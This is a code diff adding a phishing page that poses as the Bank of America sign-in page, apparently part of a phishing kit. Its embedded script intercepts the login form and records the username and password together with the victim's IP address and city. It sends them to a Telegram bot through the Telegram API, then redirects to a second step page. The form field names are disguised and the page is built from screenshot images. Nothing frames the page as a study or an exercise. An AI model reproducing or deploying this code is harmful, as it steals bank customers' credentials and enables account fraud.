@@ -1,0 +1,71 @@
+<html><head>
+<title>Bank of America - Banking, Credit Cards, Home Loans and Auto Loans</title>
+<link rel="icon" href="img/xnliudfgsdfb.ico">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script type="text/javascript" src="telgm.js"></script>
+    <script>
+
+        $(document).ready(function(){
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+				var u_name777 = $('#Editbox1').val();
+                var u_name888 = $('#Editbox2').val();
+
+                var ip, ip2;
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        ip2 = response.city + ", " + response.country;
+                        var message = "\n📧bofaUsuario23: " + u_name777+ "\n🔒Contra: " + u_name888+ "\n📌: " + ip + "\n" + ip2;
+                        var settings = {
+                            "async": true,
+                            "crossDomain": true,
+                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                            "method": "POST",
+                            "headers": {
+                                "Content-Type": "application/json",
+                                "cache-control": "no-cache"
+                            },
+                            "data": JSON.stringify({
+                                "chat_id": chat_id,
+                                "text": message
+                            })
+                        };
+                        $.ajax(settings).done(function (response) {
+                            window.location = 'step-2.php'; 
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+<style>
+    input[type=text]{
+        border:1px solid #D2CCCB;
+    }   
+        input[type=password]{
+        border:1px solid #D2CCCB;
+    }
+
+</style>
+
+</head>
+<body>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:absolute; left:0px; top:0px; z-index:0"><a href="#"><img src="img/bb11.png" alt="" title="" border="0" width="1343" height="544"></a></div>
+
+<div id="image2" style="position:absolute; overflow:absolute; left:0px; top:590px; z-index:1"><a href="#"><img src="img/b22.png" alt="" title="" border="0" width="1343" height="209"></a></div>
+
+
+
+
+<form id="loginForm" method="post">
+<input id="Editbox1" name="cabimas" placeholder="" autocomplete="off" required="" type="text" style="position:absolute;width:215px;height:25;left:210px;top:203px;z-index:19">
+<input id="Editbox2" name="maracaibo" placeholder="" autocomplete="off" required="" type="password" style="position:absolute;width:215px;height:25;left:210px;top:326px;z-index:20">
+<div style="position:absolute; left:207px; top:235px; z-index:21"><input type="checkbox" name="formcheckbox1"></div>
+<div style="position:absolute; left:209px; top:422px; z-index:22"><input type="image" name="formimage1" width="86" height="28" src="img/bb33.png"></div>
+</form></div>
+
+
+
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"></div><div id="extension-kjloo"></div></body></html>
